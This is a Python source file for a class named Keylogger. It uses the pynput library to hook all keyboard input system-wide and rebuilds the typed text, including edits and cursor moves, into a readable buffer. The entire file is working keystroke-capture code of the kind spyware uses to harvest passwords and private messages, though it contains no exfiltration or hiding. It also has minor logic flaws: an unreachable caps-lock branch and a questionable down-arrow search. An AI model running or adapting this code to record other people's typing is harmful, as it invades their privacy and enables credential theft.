from pynput.keyboard import Listener
import re

class Keylogger:
    shared_listener = None

    def __init__(self):
        self.cursor = 0
        self.listener = None
        self.keys = []
        self.buffer_txt = ""

    def start_log(self):
        if Keylogger.shared_listener is not None:
            Keylogger.shared_listener.stop()

        Keylogger.shared_listener = Listener(on_press=self.key_pressed)
        Keylogger.shared_listener.start()

    def key_pressed(self, key):
        if Keylogger.shared_listener is None:
            return False

        i = re.sub("'", "", str(key))
        self.keys.append(i)

        try:
            if i == "Key.enter":
                self.buffer_txt = self.buffer_txt[:self.cursor] + "\n" + self.buffer_txt[self.cursor:]
                self.cursor += 1
            elif i in (
                    "Key.shift",
                    "Key.shift_r",
                    "Key.ctrl",
                    "Key.ctrl_r",
                    "Key.ctrl_l",
                    "Key.alt",
                    "Key.alt_r",
                    "Key.alt_gr",
                    "Key.cmd",          
                    "Key.menu",
                    "Key.caps_lock",
                    "Key.num_lock",
                    "Key.scroll_lock",
                    "Key.escape",
                    "Key.print_screen",
                    "Key.delete",
                    "Key.pause",
                    "Key.f1", "Key.f2", "Key.f3", "Key.f4",
                    "Key.f5", "Key.f6", "Key.f7", "Key.f8",
                    "Key.f9", "Key.f10", "Key.f11", "Key.f12"):
                pass
            elif i == "Key.backspace":
                if self.cursor > 0:
                    self.buffer_txt = self.buffer_txt[:self.cursor-1] + self.buffer_txt[self.cursor:]
                    self.cursor -= 1
            elif i == "Key.space":
                self.buffer_txt = self.buffer_txt[:self.cursor] + " " + self.buffer_txt[self.cursor:]
                self.cursor += 1
            elif i == "Key.up":
                pos = self.buffer_txt.rfind("\n", 0, self.cursor)
                if pos != -1:
                    self.cursor = pos
            elif i == "Key.down":
                pos = self.buffer_txt.rfind("\n", self.cursor)
                if pos != -1:
                    self.cursor = pos + 1
            elif i == "Key.right":
                if self.cursor < len(self.buffer_txt):
                    self.cursor += 1
            elif i == "Key.left":
                if self.cursor > 0:
                    self.cursor -= 1
            elif i == "Key.tab":
                self.buffer_txt = self.buffer_txt[:self.cursor] + " !<tab>! " + self.buffer_txt[self.cursor:]
                self.cursor += len(" !<tab>! ")
            elif i == "Key.caps_lock":
                self.buffer_txt = self.buffer_txt[:self.cursor] + " !<capslock>! " + self.buffer_txt[self.cursor:]
                self.cursor += len(" !<capslock>! ")
            else:
                self.buffer_txt = self.buffer_txt[:self.cursor] + i + self.buffer_txt[self.cursor:]
                self.cursor += 1

        except Exception as e:
            print(f"{e}")

    def baca_log(self):
        try:
            return self.buffer_txt
        except:
            return ""

    def stop_listener(self):
        if Keylogger.shared_listener is not None:
            try:
                Keylogger.shared_listener.stop()
            except Exception as e:
                print(f"{e}")
            finally:
                Keylogger.shared_listener = None
            
        self.buffer_txt = ""
        self.keys = []
        self.cursor = 0
